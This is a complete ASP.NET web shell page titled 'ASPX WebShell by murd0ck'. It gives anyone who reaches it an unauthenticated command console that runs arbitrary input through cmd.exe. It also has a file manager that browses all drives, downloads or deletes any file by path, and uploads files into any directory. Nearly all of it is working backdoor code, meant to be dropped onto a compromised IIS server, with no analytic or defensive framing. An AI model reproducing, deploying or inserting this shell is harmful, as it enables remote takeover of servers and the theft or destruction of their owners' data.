<%@ Page Language="C#" Debug="true" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string dir = Request.QueryString["fdir"] ?? Server.MapPath(".");
        dir = dir.Replace("\\", "/").TrimEnd('/') + "/";

        if (Request["ajax"] == "1")
        {
            string cmd = Request["cmd"];
            string output = "";
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = dir
                };
                using (var proc = Process.Start(psi))
                {
                    output = proc.StandardOutput.ReadToEnd();
                    output += proc.StandardError.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
                output = ex.ToString();
            }
            Response.ContentType = "text/plain";
            Response.Write(output);
            Response.End();
        }

        string outstr = "";
        string[] dirparts = dir.Split(new[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
        string linkwalk = "";
        foreach (string curpart in dirparts)
        {
            linkwalk += curpart + "/";
            outstr += "<a href='?fdir=" + HttpUtility.UrlEncode(linkwalk) + "'>" + HttpUtility.HtmlEncode(curpart) + "/</a>&nbsp;";
        }
        lblPath.Text = outstr;

        outstr = "";
        foreach (DriveInfo curdrive in DriveInfo.GetDrives())
        {
            if (!curdrive.IsReady) continue;
            string root = curdrive.RootDirectory.Name.Replace("\\", "");
            outstr += "<a href='?fdir=" + HttpUtility.UrlEncode(root) + "'>" + HttpUtility.HtmlEncode(root) + "</a>&nbsp;";
        }
        lblDrives.Text = outstr;

        if (!string.IsNullOrEmpty(Request.QueryString["get"]))
        {
            string file = Request.QueryString["get"];
            if (File.Exists(file))
            {
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(file));
                Response.WriteFile(file);
                Response.End();
            }
        }
        if (!string.IsNullOrEmpty(Request.QueryString["del"]))
        {
            string file = Request.QueryString["del"];
            if (File.Exists(file)) File.Delete(file);
        }
        if (IsPostBack && flUp.HasFile)
        {
            string uploadPath = Path.Combine(dir, Path.GetFileName(flUp.FileName));
            flUp.SaveAs(uploadPath);
        }

        DirectoryInfo di = new DirectoryInfo(dir);
        outstr = "";
        foreach (DirectoryInfo subdir in di.GetDirectories())
        {
            outstr += "<tr><td><a href='?fdir=" + HttpUtility.UrlEncode(Path.Combine(dir, subdir.Name)) + "'>" + HttpUtility.HtmlEncode(subdir.Name) + "</a></td><td>&lt;DIR&gt;</td><td></td></tr>";
        }
        foreach (FileInfo file in di.GetFiles())
        {
            string fpath = Path.Combine(dir, file.Name);
            string getUrl = "?get=" + HttpUtility.UrlEncode(fpath);
            string delUrl = "?fdir=" + HttpUtility.UrlEncode(dir) + "&del=" + HttpUtility.UrlEncode(fpath);
            outstr += "<tr><td><a href='" + getUrl + "' target='_blank'>" + HttpUtility.HtmlEncode(file.Name) + "</a></td><td>" + (file.Length / 1024) + "</td><td><a href='" + delUrl + "'>Delete</a></td></tr>";
        }
        lblDirOut.Text = outstr;
    }
</script>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="color-scheme" content="dark light" />
    <title>ASPX WebShell by murd0ck</title>

    
    <style>
        
        :root {
            /* Palette */
            --bg-gradient: radial-gradient(ellipse at top, #20222b 0%, #0e0f13 100%);
            --panel-bg: rgba(255,255,255,0.04);
            --panel-border: rgba(255,255,255,0.09);
            --text-main: #e5e7eb;
            --text-dim: #9ca0aa;
            --accent-1: #8e66ff;
            --accent-2: #3c8cff;
            /* UI */
            --radius: 14px;
            --shadow: 0 8px 24px rgba(0,0,0,0.35);
        }
        *{box-sizing:border-box;margin:0;padding:0}
        body{
            min-height:100vh;
            background:var(--bg-gradient) fixed;
            color:var(--text-main);
            font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
            padding:48px 26px;
            display:flex;
            flex-direction:column;
            gap:48px;
        }
        h1{
            text-align:center;
            font-size:28px;
            font-weight:600;
            background:-webkit-linear-gradient(135deg,var(--accent-1),var(--accent-2));
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
            margin-bottom:12px;
        }
        h2{
            font-size:18px;
            font-weight:600;
            color:var(--accent-2);
            margin-bottom:20px;
        }
        /* === Container === */
        .container{
            display:grid;
            grid-template-columns:1fr 1fr;
            gap:40px;
        }
        .panel{
            background:var(--panel-bg);
            border:1px solid var(--panel-border);
            border-radius:var(--radius);
            backdrop-filter:blur(18px) saturate(160%);
            box-shadow:var(--shadow);
            padding:32px 28px;
        }
        /* === Console === */
        pre{
            background:#12141b;
            border:1px solid #1e2027;
            border-radius:var(--radius);
            padding:18px;
            font-family:SFMono-Regular,Consolas,Menlo,monospace;
            font-size:13px;
            margin-top:22px;
            overflow-x:auto;
        }
        /* === Table Files === */
        table.files{
            width:100%;
            border-collapse:collapse;
            margin-top:14px;
        }
        table.files th,table.files td{
            font-size:14px;
            padding:12px 16px;
            border-bottom:1px solid var(--panel-border);
        }
        table.files th{
            color:var(--text-main);
            text-align:left;
            font-weight:500;
            background:rgba(255,255,255,0.03);
        }
        table.files tr:last-child td{border-bottom:none}
        a{color:var(--accent-2);text-decoration:none}
        a:hover{text-decoration:underline}
        /* === Inputs === */
        input[type="text"],input[type="file"]{
            width:100%;
            padding:14px 16px;
            border:1px solid var(--panel-border);
            border-radius:var(--radius);
            background:#181a22;
            color:var(--text-main);
            font-size:14px;
            margin-bottom:20px;
        }
        input::placeholder{color:var(--text-dim)}
        /* === Buttons === */
        .btn{
            display:inline-flex;
            align-items:center;
            justify-content:center;
            padding:13px 32px;
            font-size:14px;
            font-weight:500;
            color:#fff;
            background:linear-gradient(135deg,var(--accent-1),var(--accent-2));
            border:none;
            border-radius:var(--radius);
            cursor:pointer;
            transition:transform .15s ease,box-shadow .2s ease;
        }
        .btn:hover{
            box-shadow:0 4px 18px rgba(60,140,255,0.45);
            transform:translateY(-2px);
        }
        .btn:active{transform:translateY(0)}
        .upload-container{display:flex;align-items:center;gap:18px;flex-wrap:wrap;margin-top:10px}
        #cmdOutput.loading{animation:blink 1s ease infinite alternate}
        @keyframes blink{from{opacity:1}to{opacity:.5}}
        @media(max-width:900px){
            .container{grid-template-columns:1fr}
            body{padding:32px 18px;gap:32px}
        }
    </style>

    
    <script>
        document.addEventListener("DOMContentLoaded",()=>{
            const box=document.getElementById("cmdBox");
            box.addEventListener("keydown",e=>{if(e.key==="Enter"){e.preventDefault();runCommand();}});
        });
        function runCommand(){
            const cmd=document.getElementById("cmdBox").value;
            const out=document.getElementById("cmdOutput");
            out.classList.add("loading");
            fetch("?ajax=1",{
                method:"POST",
                headers:{"Content-Type":"application/x-www-form-urlencoded"},
                body:"cmd="+encodeURIComponent(cmd)
            }).then(r=>r.text()).then(t=>{out.classList.remove("loading");out.textContent=t;}).catch(err=>{out.classList.remove("loading");out.textContent="Error: "+err;});
        }
    </script>
</head>
<body>
    <h1>ASPX WebShell by murd0ck</h1>
    <form id="form1" runat="server">
        <div class="container">
            <!-- Console Panel -->
            <div class="panel">
                <h2>Command Console</h2>
                <input type="text" id="cmdBox" placeholder="Enter command..." />
                <button type="button" class="btn" onclick="runCommand()">Execute</button>
                <pre id="cmdOutput"></pre>
            </div>
            <!-- File Manager Panel -->
            <div class="panel">
                <h2>File Manager</h2>
                <p><strong>Drives:</strong> <asp:Literal runat="server" ID="lblDrives" /></p>
                <p><strong>Current Path:</strong> <asp:Literal runat="server" ID="lblPath" /></p>

                <table class="files">
                    <tr><th>Name</th><th>Size&nbsp;(KB)</th><th>Actions</th></tr>
                    <asp:Literal runat="server" ID="lblDirOut" />
                </table>

                <p style="margin-top:20px;"><strong>Upload File:</strong></p>
                <div class="upload-container">
                    <asp:FileUpload runat="server" ID="flUp" />
                    <asp:Button runat="server" ID="cmdUpload" Text="Upload" CssClass="btn" />
                </div>
            </div>
        </div>
    </form>
</body>
</html>
